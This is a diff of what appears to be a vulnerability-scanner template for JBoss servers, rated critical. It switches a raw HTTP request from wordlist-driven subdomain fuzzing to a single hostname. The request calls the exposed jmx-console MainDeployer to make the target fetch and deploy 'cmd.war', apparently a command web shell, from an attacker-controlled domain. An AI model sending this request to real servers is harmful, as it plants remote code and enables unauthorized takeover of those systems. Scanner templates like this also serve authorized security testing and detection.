@@ -8,14 +8,11 @@ info:
   - https://blog.safebuff.com/2016/07/03/SSRF-Tips/
   severity: critical
 requests:
-- attack: sniper
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://{{Host}}.{{Port}}.{{Subdomains}}.jboss.{{MY-DOMAIN}}/utils/cmd.war
+- raw:
+  - 'GET /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://{{Host}}.{{Port}}.{{Hostname}}.jboss.{{MY-DOMAIN}}/utils/cmd.war
     HTTP/1.1
 
-    Host: {{Subdomains}}
+    Host: {{Hostname}}
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
@@ -24,4 +21,3 @@ requests:
     Accept: */*
 
     Connection: keep-aliv'
-  threads: 100
